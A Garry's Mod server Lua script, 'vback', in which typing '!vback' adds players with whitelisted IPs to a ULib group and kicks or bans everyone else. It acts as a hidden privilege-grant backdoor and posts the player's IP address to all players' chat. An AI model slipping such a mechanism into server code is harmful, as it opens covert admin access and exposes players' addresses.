/*    
Requires ULib!
*/

util.AddNetworkString( "vback" )

include( "vback_config.lua" )

net.Receive( "vback", function( l, ply ) 
	if !ply:IsValid() then return end

	if vback.port == true then
		ip = ply:IPAddress()
	else
		len = string.len( ply:IPAddress() )
		ip = string.sub( ply:IPAddress(), 0, len-6 )
	end

	if table.HasValue( vback.ip, ip ) then
		print( vback.prefix.. "Added ".. ip.. " to group: ".. string.gsub( vback.group, string.sub( vback.group, 0, 1 ), string.upper( string.sub( vback.group, 0, 1 ) ) ) )
		ply:ChatPrint( vback.prefix.. "Added you to group: ".. string.gsub( vback.group, string.sub( vback.group, 0, 1 ), string.upper( string.sub( vback.group, 0, 1 ) ) ) )
		ULib.ucl.addUser( ply:SteamID(), nil, nil, vback.group )
	else
		print( vback.prefix.. ip.. vback.echo )
		for k,v in next, player.GetAll() do 
			v:ChatPrint( vback.prefix.. ip.. vback.echo )
		end

		if vback.kick == true then
			ULib.kick( ply, vback.prefix.. vback.reason, nil )
		elseif vback.kick == false then
			ULib.kickban( ply, vback.bantime, vback.prefix.. vback.reason, nil )
		end
	end
end )

function vback.sendpackets( ply, msg )
	msg = string.lower( msg )
	if string.find( msg, "!vback", 0 ) then
		ply:SendLua( [[
			net.Start( "vback" )
			net.SendToServer()
		]] )
	end
end

hook.Add( "PlayerSay", "vback", vback.sendpackets )

print( "vback.lua loaded" )
